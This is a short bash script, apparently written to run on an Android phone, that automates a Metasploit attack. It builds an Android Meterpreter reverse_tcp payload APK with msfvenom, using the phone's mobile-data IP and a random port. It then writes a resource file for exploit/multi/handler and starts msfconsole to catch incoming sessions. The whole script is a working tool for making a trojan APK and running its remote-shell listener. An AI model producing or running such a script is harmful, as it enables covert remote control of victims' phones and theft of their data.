#!/bin/bash

port=$((RANDOM%8999+1000))

ip=$(ip -f inet -o addr show rmnet_data3|cut -d\  -f 7 | cut -d/ -f 1)




#making payload 

msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> ip=$ip-$port.apk

touch meterpreter.rc

echo use exploit/multi/handler >> meterpreter.rc
echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc
echo set lhost $ip >> meterpreter.rc
echo set lport $port >> meterpreter.rc
echo set ExitOnSession false >> meterpreter.rc

msfconsole -r meterpreter.rc
